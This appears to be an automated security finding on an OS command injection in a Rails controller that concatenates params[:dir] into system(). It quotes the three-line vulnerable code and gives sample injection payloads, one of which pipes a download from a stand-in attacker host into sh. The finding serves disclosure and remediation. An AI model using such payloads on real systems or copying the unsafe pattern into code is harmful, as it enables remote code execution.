### OS command injection via unsanitized params[:dir] in system()

- **ID:** `model-1cb16bbe2d7e132d`
- **Status:** unresolved
- **Severity:** critical
- **CWE:** CWE-78

The controller concatenates the attacker-controlled request parameter params[:dir] into a single command string passed to Kernel#system. Because the whole command is one shell string, Ruby invokes it through /bin/sh, so shell metacharacters are interpreted. A request such as ?dir=. ; id or ?dir=$(curl attacker.tld/x|sh) yields arbitrary command execution as the Rails process user.

- Source: app/vuln_cmd.rb:3 (native-hunt, model-hunt)

1: class FilesController &lt; ApplicationController
2:   def list
3:     system(&quot;ls &quot; + params[:dir])
4:   end
5: end</pre>
